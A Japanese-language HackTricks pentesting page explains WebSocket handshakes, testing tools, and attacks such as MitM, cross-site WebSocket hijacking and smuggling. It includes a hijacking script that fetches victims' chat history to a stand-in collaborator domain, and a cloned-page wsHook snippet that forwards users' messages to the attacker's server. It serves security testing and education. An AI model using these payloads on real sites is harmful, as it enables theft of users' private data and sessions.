# WebSocket攻撃

{{#include ../banners/hacktricks-training.md}}

## WebSocketとは

WebSocket接続は、最初の**HTTP**ハンドシェイクを通じて確立され、**長期間**の接続を目的としており、トランザクションシステムを必要とせずにいつでも双方向のメッセージングを可能にします。これにより、WebSocketは**低遅延またはサーバー起動の通信**を必要とするアプリケーションに特に有利です。 

### WebSocket接続の確立

WebSocket接続の確立に関する詳細な説明は[**こちら**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)でアクセスできます。要約すると、WebSocket接続は通常、以下に示すようにクライアント側のJavaScriptを介して開始されます：
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
`wss`プロトコルは**TLS**で保護されたWebSocket接続を示し、`ws`は**保護されていない**接続を示します。

接続の確立中に、ブラウザとサーバーの間でHTTPを介してハンドシェイクが行われます。ハンドシェイクプロセスでは、ブラウザがリクエストを送信し、サーバーが応答します。以下の例に示されています：

ブラウザがハンドシェイクリクエストを送信します：
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
サーバーのハンドシェイク応答:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
接続は確立されると、双方向でメッセージ交換のためにオープンのままになります。

**WebSocketハンドシェイクの重要なポイント:**

- `Connection`および`Upgrade`ヘッダーはWebSocketハンドシェイクの開始を示します。
- `Sec-WebSocket-Version`ヘッダーは、希望するWebSocketプロトコルバージョンを示し、通常は`13`です。
- Base64エンコードされたランダム値が`Sec-WebSocket-Key`ヘッダーに送信され、各ハンドシェイクがユニークであることを保証し、キャッシングプロキシによる問題を防ぎます。この値は認証のためではなく、応答が誤って構成されたサーバーやキャッシュによって生成されていないことを確認するためのものです。
- サーバーの応答における`Sec-WebSocket-Accept`ヘッダーは`Sec-WebSocket-Key`のハッシュであり、WebSocket接続を開くサーバーの意図を確認します。

これらの機能は、ハンドシェイクプロセスが安全で信頼性があることを保証し、効率的なリアルタイム通信への道を開きます。

### Linuxコンソール

`websocat`を使用してWebSocketとの生の接続を確立できます。
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
ウェブソケットサーバーを作成するには:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket connections

もしクライアントが現在のローカルネットワークから**HTTP websocket**に接続していることがわかった場合、[ARP Spoofing Attack](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)を試みて、クライアントとサーバーの間でMitM攻撃を実行することができます。\
クライアントが接続しようとしたら、次に使用できます:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

**ツール** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **を使用して、Websocket内の既知の** **脆弱性** **を自動的に発見、フィンガープリンティング、検索できます。**

### Websocket Debug tools

- **Burp Suite** は、通常のHTTP通信と非常に似た方法でMitM Websockets通信をサポートしています。
- [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite拡張機能** は、**履歴**を取得し、**インターセプションルール**を設定し、**マッチと置換**ルールを使用し、**Intruder**や**AutoRepeater**を使用することで、Burp内のWebsocket通信をより良く管理できるようにします。
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** "**WebSocket/Socket.io Proxy**"の略で、このNode.jsで書かれたツールは、クライアントとサーバー間のすべてのWebSocketおよびSocket.IO通信を**キャプチャ、インターセプト、カスタム**メッセージを送信し、表示するためのユーザーインターフェースを提供します。
- [**wsrepl**](https://github.com/doyensec/wsrepl) は、特にペネトレーションテスト用に設計された**インタラクティブWebsocket REPL**です。**受信Websocketメッセージを観察し、新しいメッセージを送信する**ためのインターフェースを提供し、この通信を**自動化**するための使いやすいフレームワークを提供します。&#x20;
- [**https://websocketking.com/**](https://websocketking.com/) は、**websockets**を使用して他のウェブと通信するための**ウェブ**です。
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) は、他の通信/プロトコルの種類の中で、**websockets**を使用して他のウェブと通信するための**ウェブ**を提供します。

## Websocket Lab

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) では、Websocketsを使用してウェブを起動するためのコードがあります。また、[**この投稿**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) では説明を見つけることができます。

## Cross-site WebSocket hijacking (CSWSH)

**クロスサイトWebSocketハイジャック**、または**クロスオリジンWebSocketハイジャック**は、WebSocketハンドシェイクに影響を与える特定のケースとして**[クロスサイトリクエストフォージェリ（CSRF）](csrf-cross-site-request-forgery.md)**として特定されます。この脆弱性は、WebSocketハンドシェイクが**HTTPクッキー**のみで認証され、**CSRFトークン**や同様のセキュリティ対策がない場合に発生します。

攻撃者は、脆弱なアプリケーションに対してクロスサイトWebSocket接続を開始する**悪意のあるウェブページ**をホストすることでこれを悪用できます。その結果、この接続はアプリケーションとの被害者のセッションの一部として扱われ、セッション処理メカニズムにおけるCSRF保護の欠如を利用します。

### Simple Attack

**websocket**接続を**確立**する際に、**クッキー**が**サーバー**に**送信**されることに注意してください。**サーバー**は、送信されたクッキーに基づいて各**特定の** **ユーザー**をその**websocket** **セッション**に**関連付ける**ためにそれを使用している可能性があります。

次に、例えば**websocket** **サーバー**がユーザーの**会話の履歴**を**返送**する場合、"**READY"**というメッセージが送信されると、**単純なXSS**が接続を確立し（**クッキー**は被害者ユーザーを認証するために**自動的に送信**されます）、"**READY**"を送信することで**会話の履歴**を**取得**できるようになります。
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### クロスオリジン + 異なるサブドメインのクッキー

このブログ投稿 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) では、攻撃者が **サブドメイン** の **クッキー** を **送信** し、**Websocketがオリジンを正しくチェックしなかったため**、そのサブドメインで **任意のJavascriptを実行** することに成功しました。これにより、通信が可能になり、**トークンを盗む** ことができました。

### ユーザーからデータを盗む

なりすましたいウェブアプリケーションをコピーし（例えば .html ファイル）、ウェブソケット通信が行われているスクリプト内にこのコードを追加します:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
`wsHook.js`ファイルを[https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook)からダウンロードし、**ウェブファイルのフォルダ内に保存してください**。\
ウェブアプリケーションを公開し、ユーザーがそれに接続することで、websocketを介して送信および受信されたメッセージを盗むことができます：
```javascript
sudo python3 -m http.server 80
```
## レースコンディション

WebSocketにおけるレースコンディションも存在します。[この情報を確認して、詳細を学んでください](race-condition.md#rc-in-websockets)。

## その他の脆弱性

WebSocketは**サーバー側とクライアント側にデータを送信するメカニズム**であり、サーバーとクライアントが情報をどのように処理するかによって、**WebSocketはXSS、SQLi、またはWebSocketからのユーザー入力を使用した他の一般的なWeb脆弱性を悪用するために使用される可能性があります。**

## **WebSocketスモグリング**

この脆弱性により、**逆プロキシの制限を回避する**ことができ、**WebSocket通信が確立された**と信じ込ませることができます（たとえそれが真実でなくても）。これにより、攻撃者は**隠されたエンドポイントにアクセスする**ことができる可能性があります。詳細については、以下のページを確認してください：

{{#ref}}
h2c-smuggling.md
{{#endref}}

## 参考文献

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

{{#include ../banners/hacktricks-training.md}}
